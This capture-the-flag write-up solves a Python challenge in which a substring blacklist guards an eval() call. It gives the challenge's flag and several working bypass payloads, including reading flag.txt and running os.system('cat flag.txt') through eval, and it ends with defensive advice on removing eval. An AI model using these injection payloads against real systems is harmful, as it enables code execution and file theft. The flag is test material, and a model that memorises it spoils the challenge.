# Picker II

| | |
|---|---|
| **Category** | Reverse Engineering |
| **Difficulty** | Easy |
| **Author** | LT 'syreal' Jones |
| **Files** | `picker-II.py` |
| **Flag** | `academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_e9683452}` |

## Challenge

> Can you figure out how this program works to get the flag?

Same service as [Picker I](../../Picker_I/sol/README.md), with one change: a filter.

## Analysis

The loop still calls `eval(user_input + '()')`, but now input goes through a blacklist:

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True

while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
```

Typing `win` is blocked (`Illegal input`). The filter only looks for the substring `win`; it does not restrict what else `eval` can run.

`win()` itself just reads `flag.txt` and prints it as hex. We don't need `win` at all, since `eval` can open the file directly.

## Exploit

```
==> win
Illegal input
==> print(open('flag.txt', 'r').read())
academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_e9683452}
'NoneType' object is not callable
```

Why it works: the program evaluates `print(open('flag.txt', 'r').read())()`. The inner `print(...)` runs and outputs the flag, then Python tries to call its return value (`None`), which raises the `NoneType` error. The flag is already printed by then, and the error just ends the session.

### Other bypasses

Any way to build `win` without the literal substring works:

- `globals()['wi'+'n']`: this calls `win()` and then `None()` (error after the hex output)
- `eval('wi'+'n')`: same idea
- `__import__('os').system('cat flag.txt')`: also works, since `os` can be imported inside `eval`

## Takeaways

- Blacklist filters on `eval` input almost never work; there are too many ways to reach the same behavior.
- The right fix is to remove `eval` and use a dictionary of allowed commands, e.g. `{"getRandomNumber": getRandomNumber, ...}`.
